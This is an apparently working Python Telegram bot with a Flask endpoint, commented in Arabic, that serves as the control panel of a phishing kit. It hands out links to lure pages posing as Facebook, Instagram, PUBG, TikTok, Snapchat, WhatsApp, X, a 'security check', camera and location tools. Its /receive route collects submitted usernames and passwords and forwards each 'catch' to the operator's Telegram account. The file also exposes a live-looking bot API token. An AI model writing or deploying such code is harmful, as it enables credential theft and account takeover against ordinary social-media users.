import telebot
from telebot import types
from flask import Flask, request
from threading import Thread

# --- إعدادات الجنرال النهائية ---
API_TOKEN = '7929608386:AAE8dCcbTPRTEBpVPvhyIsfdyLl42mmRfnM'
MY_ID = 6829017835  # الـ ID الخاص بك الذي زودتني به الآن
bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)

# رابط صفحات ريندر الاحترافي
BASE_URL = "https://html-46zt.onrender.com"

WELCOME_MSG = """
🔱 **أهلاً بك يا جنرال في مركز القيادة الجديد** 🔱

الآن تم ربط القاعدة برقمك التعريفي الخاص. 
أي صيد من الـ 11 صفحة سيصلك هنا فوراً.
"""

def main_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btns = [
        types.InlineKeyboardButton("🔵 فيسبوك", callback_data="link_fb_orig"),
        types.InlineKeyboardButton("📸 إنستقرام", callback_data="link_ig_gift"),
        types.InlineKeyboardButton("🎮 ببجي UC", callback_data="link_pubg_uc"),
        types.InlineKeyboardButton("🎵 تيك توك", callback_data="link_tk_coins"),
        types.InlineKeyboardButton("👻 سناب شات", callback_data="link_snap_gift"),
        types.InlineKeyboardButton("🔹 تلغرام", callback_data="link_tg_prem"),
        types.InlineKeyboardButton("🟢 واتساب", callback_data="link_wa_update"),
        types.InlineKeyboardButton("𝕏 تويتر", callback_data="link_x_login"),
        types.InlineKeyboardButton("🛡️ فحص أمان", callback_data="link_sec_check"),
        types.InlineKeyboardButton("📷 كاميرا", callback_data="link_tool_cam"),
        types.InlineKeyboardButton("📍 موقع", callback_data="link_tool_loc")
    ]
    markup.add(*btns)
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, WELCOME_MSG, reply_markup=main_keyboard(), parse_mode='Markdown')

@bot.callback_query_handler(func=lambda c: c.data.startswith("link_"))
def handle_links(c):
    page = c.data.replace("link_", "")
    final_link = f"{BASE_URL}/{page}.html"
    bot.send_message(c.message.chat.id, f"🚀 **الرابط الاحترافي جاهز:**\n\n`{final_link}`", parse_mode='Markdown')

@app.route('/receive', methods=['POST'])
def receive():
    data = request.json
    if data:
        platform = data.get('platform', 'غير معروف')
        user = data.get('u', 'لا يوجد')
        password = data.get('p', 'لا يوجد')
        
        hit_msg = f"""
🔱 **تم اصطياد صيد جديد يا جنرال!** 🔱

📱 **المنصة:** {platform}
👤 **اليوزر:** `{user}`
🔑 **الباسورد:** `{password}`

✅ **الحالة:** البيانات صحيحة ووصلت للقاعدة.
        """
        # الإرسال للـ ID الجديد الخاص بك
        bot.send_message(MY_ID, hit_msg, parse_mode='Markdown')
        
    return "OK", 200

def run():
    app.run(host='0.0.0.0', port=10000)

if __name__ == "__main__":
    Thread(target=run).start()
    bot.infinity_polling()
